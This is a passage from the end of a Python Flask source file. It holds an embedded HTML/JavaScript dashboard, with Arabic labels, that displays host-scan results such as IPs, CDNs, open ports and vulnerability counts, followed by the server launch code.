                updateStats(data.total_scanned, data.successful, data.current_host || '-', data.total_scanned > 0 ? Math.round(data.successful / data.total_scanned * 100) : 0);
                
                if (!data.running) {
                    document.getElementById('btn_start').disabled = false;
                    document.getElementById('btn_stop').disabled = true;
                    document.getElementById('status').textContent = '✅ الفحص متوقف';
                    document.getElementById('status').className = 'status status-idle';
                    if (updateInterval) { clearInterval(updateInterval); updateInterval = null; }
                }
                
                renderHosts(data.recent_results || []);
                if (data.recent_results && data.recent_results.length > 0) {
                    const last = data.recent_results[data.recent_results.length - 1];
                    document.getElementById('results').innerHTML = JSON.stringify(last, null, 2);
                }
            });
        }
        
        function renderHosts(results) {
            const grid = document.getElementById('hosts_grid');
            if (!results || results.length === 0) {
                grid.innerHTML = '<div style="text-align:center;padding:20px;color:#666;">⏳ انتظر النتائج...</div>';
                return;
            }
            
            let html = '';
            const latest = results.slice(-15).reverse();
            latest.forEach(result => {
                const statusClass = result.success ? 'success' : 'fail';
                const statusText = result.success ? '✅ ناجح' : '❌ فاشل';
                let badges = '';
                if (result.vulnerabilities && result.vulnerabilities.length > 0) {
                    badges += `<span class="badge badge-danger">🔴 ${result.vulnerabilities.length} ثغرة</span>`;
                }
                if (result.cdn) {
                    badges += `<span class="badge badge-info">🛡️ ${result.cdn}</span>`;
                }
                const geo = result.geolocation || {};
                html += `
                    <div class="host-card ${statusClass}">
                        <div class="host-name">${result.domain}</div>
                        <div>📡 ${result.ip || 'لا يوجد'}</div>
                        <div>🌍 ${geo.country || 'غير معروف'} | 🛡️ ${result.cdn || 'لا يوجد'}</div>
                        <div>🔌 ${result.open_ports ? result.open_ports.length : 0} منفذ</div>
                        <div>⭐ ${result.score || 0}/100 - ${statusText}</div>
                        <div>${badges}</div>
                    </div>
                `;
            });
            grid.innerHTML = html;
        }
        
        function updateStats(total, success, current, score) {
            document.getElementById('stat_total').textContent = total || 0;
            document.getElementById('stat_success').textContent = success || 0;
            document.getElementById('stat_current').textContent = current;
            document.getElementById('stat_score').textContent = score || 0;
            const progress = total > 0 ? Math.min(success / total * 100, 100) : 0;
            document.getElementById('progress').style.width = progress + '%';
        }
    </script>
</body>
</html>
"""

# ===================== التشغيل =====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
